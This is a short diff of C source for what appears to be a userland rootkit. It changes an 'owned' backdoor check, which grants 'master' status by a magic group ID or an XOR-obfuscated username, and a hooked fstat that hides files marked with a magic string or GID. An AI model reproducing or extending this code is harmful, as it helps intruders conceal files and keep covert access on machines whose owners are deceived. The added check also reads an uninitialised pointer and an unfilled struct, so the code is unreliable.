@@ -29,15 +29,33 @@ void *libc;
 
 int owned(void)
 { 
+	#ifdef DEBUG
+	printf("[!] owned called\n"); 
+	#endif 
+
+	char *user = strdup(USER); xor(user); 
 	int x;
-	
-	if (getgid() == MAGICGID)
-	{
-		setuid(0); 
-		x = 1; 
-	} 
-	else 
+	struct passwd pwent; 
+	struct passwd *pwentp; 
+	if (pwentp != NULL)
+	{ 
+		if ((strcmp(pwent.pw_name, user) == 0) || (getgid() == MAGICGID))
+		{ 
+			#ifdef DEBUG
+			printf("[-] Hello master!\n");
+			#endif 
+			x = 1; 
+		} 
+		else
+		{ 
+			x = 0;
+		}
+	}	
+	else
+	{ 
 		x = 0; 
+	} 
+	CLEAN(user);
 	return x; 
 } 
 
@@ -227,8 +245,8 @@ int fstat(int fildes, struct stat *buf)
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat;
 	char name[256];
-    memset(&filestat, 0x00, sizeof(filestat));
-    name_from_fd(fildes, name, sizeof(name));	
+    	memset(&filestat, 0x00, sizeof(filestat));
+    	name_from_fd(fildes, name, sizeof(name));	
 	old_fstat(fildes, &filestat);	
 	if ((strstr((const char *)name, magic) != NULL ) || (filestat.st_gid == MAGICGID))
 	{
